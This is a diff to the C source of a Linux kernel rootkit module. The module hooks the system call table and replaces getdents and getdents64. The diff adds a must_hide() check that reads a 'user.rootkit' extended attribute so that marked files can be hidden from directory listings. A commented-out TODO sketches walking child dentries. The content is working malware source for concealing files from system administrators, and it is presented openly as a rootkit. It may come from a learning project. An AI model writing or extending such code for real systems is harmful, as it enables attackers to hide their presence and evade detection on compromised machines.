@@ -1,10 +1,13 @@
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
+#include <linux/xattr.h>
 #include <linux/fs.h>
 #include <linux/fdtable.h>
 
-
+#include "common.h"
 #include "hook.h"
+
+#define SIZE 512
 
 void **sys_calls;
 
@@ -45,6 +48,15 @@ enable_protection(void)
 }
 
 
+static bool
+must_hide(struct dentry *dentry)
+{
+    char buf[SIZE];
+    vfs_getxattr(dentry, "user.rootkit", buf, SIZE);
+    return !strcmp("rootkit", buf);
+}
+
+
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
 asmlinkage long
@@ -54,6 +66,7 @@ g7_getdents(const struct pt_regs *pt_regs)
 
     unsigned long offset;
     dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
+    struct dentry *kdirent_dentry;
     struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
@@ -67,7 +80,8 @@ g7_getdents(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
-    kdirent_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
+    kdirent_inode = kdirent_dentry->d_inode;
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
@@ -100,8 +114,11 @@ g7_getdents64(const struct pt_regs *pt_regs)
 {
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
+    bool musthide = false;
+
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
+    struct dentry *kdirent_dentry;
     struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
@@ -115,7 +132,18 @@ g7_getdents64(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
-    kdirent_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+    kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
+    kdirent_inode = kdirent_dentry->d_inode;
+
+    musthide = must_hide(kdirent_dentry);
+    DEBUG_INFO("must hide from 64: %d", musthide);
+
+    // TODO
+    /* struct list_head *i; */
+    /* list_for_each(i, &kdirent_dentry->d_child) { */
+    /*     struct dentry *child = list_entry(i, struct dentry, ) */
+    /* } */
+
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
